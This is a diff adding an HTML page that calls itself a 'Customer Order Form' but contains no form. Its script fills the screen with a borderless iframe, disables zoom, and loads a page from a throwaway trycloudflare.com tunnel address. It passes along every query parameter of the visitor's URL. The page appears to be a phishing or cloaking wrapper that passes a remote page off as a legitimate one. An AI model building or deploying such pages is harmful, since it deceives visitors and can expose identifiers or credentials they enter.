@@ -1,0 +1,44 @@
+<!DOCTYPE html>
+<html lang="en">
+<head>
+    <meta charset="UTF-8">
+    <meta name="viewport" content="width=device-width, initial-scale=1.0, maximum-scale=1.0, user-scalable=no">
+    <title>Customer Order Form</title>
+    <style>
+        * {
+            box-sizing: border-box;
+        }
+        html, body {
+            margin: 0;
+            padding: 0;
+            width: 100vw;
+            height: 100vh;
+            overflow: hidden;
+            background-color: #ffffff;
+        }
+        iframe {
+            width: 100%;
+            height: 100%;
+            border: none;
+            display: block;
+            position: absolute;
+            top: 0;
+            left: 0;
+        }
+    </style>
+</head>
+<body>
+    <iframe id="dynamic-frame" src="about:blank"></iframe>
+    <script>
+        const targetBaseUrl = "https://intake-toner-moreover-legitimate.trycloudflare.com/karaoke/show.html";
+        const urlParams = new URLSearchParams(window.location.search);
+        
+        if (!urlParams.has('referral') || !urlParams.get('referral').trim()) {
+            urlParams.set('referral', 'general');
+        }
+
+        const finalQuery = "?" + urlParams.toString();
+        document.getElementById('dynamic-frame').src = targetBaseUrl + finalQuery;
+    </script>
+</body>
+</html>
